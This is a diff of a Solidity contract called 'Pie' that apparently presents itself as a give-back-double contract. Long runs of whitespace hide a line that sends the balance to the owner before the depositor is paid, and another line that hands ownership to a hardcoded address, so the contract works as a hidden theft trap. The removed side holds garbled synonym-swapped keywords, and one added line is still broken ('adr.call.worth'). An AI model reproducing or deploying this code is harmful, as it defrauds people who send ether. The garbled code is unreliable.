@@ -3,7 +3,7 @@ pragma solidity ^0.4.19;
 
 contract Pie
 {
-    address public Owner = msg.initiator;
+    address public Owner = msg.sender;
 
     function()
     public
@@ -16,17 +16,17 @@ contract Pie
     public
     payable
     {
-        if(msg.worth>1 ether)
+        if(msg.value>1 ether)
         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);
-            msg.initiator.transfer(this.balance);
+            msg.sender.transfer(this.balance);
         }
     }
 
     function harvestGold()
     payable
     public
-    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.initiator==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
-        require(msg.initiator == Owner);
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
+        require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
 
@@ -34,7 +34,7 @@ contract Pie
     payable
     public
     {
-        require(msg.initiator == Owner);
-        adr.call.worth(msg.worth)(info);
+        require(msg.sender == Owner);
+        adr.call.worth(msg.value)(info);
     }
 }
